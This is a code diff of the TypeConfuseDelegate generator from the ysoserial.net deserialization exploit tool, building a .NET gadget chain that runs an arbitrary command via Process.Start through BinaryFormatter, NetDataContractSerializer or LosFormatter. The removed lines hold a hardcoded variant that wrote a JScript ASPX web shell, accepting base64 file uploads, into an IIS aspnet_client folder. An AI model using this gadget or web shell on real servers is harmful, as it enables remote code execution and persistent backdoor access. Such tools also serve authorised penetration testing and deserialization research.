@@ -1,11 +1,11 @@
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
 using ysoserial.Helpers;
 using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;
- 
+
 namespace ysoserial.Generators
 {
     public class TypeConfuseDelegateGenerator : GenericGenerator
@@ -14,28 +14,28 @@ namespace ysoserial.Generators
         {
             return "TypeConfuseDelegate";
         }
- 
+
         public override string Finders()
         {
             return "James Forshaw";
         }
- 
+
         public override string Contributors()
         {
             return "Alvaro Munoz";
         }
- 
+
         public override List<string> Labels()
         {
             return new List<string> { GadgetTypes.NotBridgeNotDerived };
         }
- 
- 
+
+
         public override List<string> SupportedFormatters()
         {
             return new List<string> { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
- 
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             if(inputArgs.Minify && inputArgs.UseSimpleType && 
@@ -358,7 +358,7 @@ namespace ysoserial.Generators
     'Data': {
       '$type': 'MessageEnd'
 }}]";
- 
+
                 MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(tcd_json_minified);
                 if(formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                 {
@@ -381,7 +381,7 @@ namespace ysoserial.Generators
                 {
                     // LosFormatter
                     MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);
- 
+
                     if (inputArgs.Test)
                     {
                         try
@@ -402,9 +402,9 @@ namespace ysoserial.Generators
                 return Serialize(TypeConfuseDelegateGadget(inputArgs), formatter, inputArgs);
             }
         }
- 
+
         /* this can be used easily by the plugins as well */
- 
+
         // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
         public static object TypeConfuseDelegateGadget(string cmd)
         {
@@ -412,11 +412,11 @@ namespace ysoserial.Generators
             inputArgs.Cmd = cmd;
             return TypeConfuseDelegateGadget(inputArgs);
         }
- 
+
         public static object TypeConfuseDelegateGadget(InputArgs inputArgs)
         {
             string cmdFromFile = inputArgs.CmdFromFile;
- 
+
             if (!string.IsNullOrEmpty(cmdFromFile))
             {
                 inputArgs.Cmd = cmdFromFile;
@@ -426,15 +426,22 @@ namespace ysoserial.Generators
             Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
             IComparer<string> comp = Comparer<string>.Create(d);
             SortedSet<string> set = new SortedSet<string>(comp);
-            set.Add(@"c:\inetpub\wwwroot\aspnet_client\3.aspx");
-            set.Add("a<%@ Page Language=\"JScript\" Debug=\"true\"%><%@Import Namespace=\"System.IO\"%><%File.WriteAllBytes(Request[\"b\"], Convert.FromBase64String(Request[\"a\"]));%>");
- 
+            set.Add(inputArgs.CmdFileName);
+            if (inputArgs.HasArguments)
+            {
+                set.Add(inputArgs.CmdArguments);
+            }
+            else
+            {
+                set.Add("");
+            }
+            
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
             // Modify the invocation list to add Process::Start(string, string)
-            invoke_list[1] = new Action<string, string>(File.WriteAllText);
+            invoke_list[1] = new Func<string, string, Process>(Process.Start);
             fi.SetValue(d, invoke_list);
- 
+
             return set;
         }
         
